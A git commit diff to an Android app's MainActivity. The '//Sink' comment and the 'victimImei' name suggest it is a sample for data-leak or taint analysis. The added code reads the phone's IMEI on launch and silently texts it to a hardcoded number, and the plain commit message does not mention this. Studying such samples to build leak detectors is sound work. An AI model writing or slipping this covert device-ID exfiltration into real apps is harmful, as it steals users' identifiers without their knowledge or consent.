1fbee2ca452d6fced58119204942ccff9906451a
shivapbhusal <civabhusal@gmail.com>
2018-02-02 13:10:03 -0500

    add functions in MainActivity

--- StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/MainActivity.java
+++ StatefulIntent/app/src/main/java/com/example/shiva/statefulintent/MainActivity.java
@@ -1,7 +1,10 @@
 package com.example.shiva.statefulintent;
 
+import android.content.Context;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -9,5 +12,19 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        sendImei(getImei());
+    }
+
+    public void sendImei(String imei)
+    {
+        SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("4193784172", null, imei, null, null);  //Sink
+    }
+
+    public String getImei()
+    {
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String victimImei = telephonyManager.getDeviceId();
+        return victimImei;
     }
 }
